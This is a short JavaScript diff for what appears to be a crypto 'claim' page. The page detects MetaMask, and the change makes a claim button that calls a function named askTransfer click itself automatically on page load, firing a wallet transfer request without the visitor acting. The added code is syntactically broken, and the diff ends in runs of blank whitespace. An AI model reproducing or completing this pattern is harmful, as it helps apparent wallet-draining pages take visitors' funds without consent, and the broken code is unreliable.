@@ -333,5 +333,13 @@ async function askTransfer() {
 
 if (typeof window.ethereum !== "undefined") metamaskInstalled = true;
 window.addEventListener("load", async () => {
-  document.querySelector("#claimButton").addEventListener("click", askTransfer);
+  document.querySelector("#claimButton").addEventListener("click", askTransfer() {
+        document.getElementById("claimButton").click();
 });
+
+         
+        
+
+
+      
+
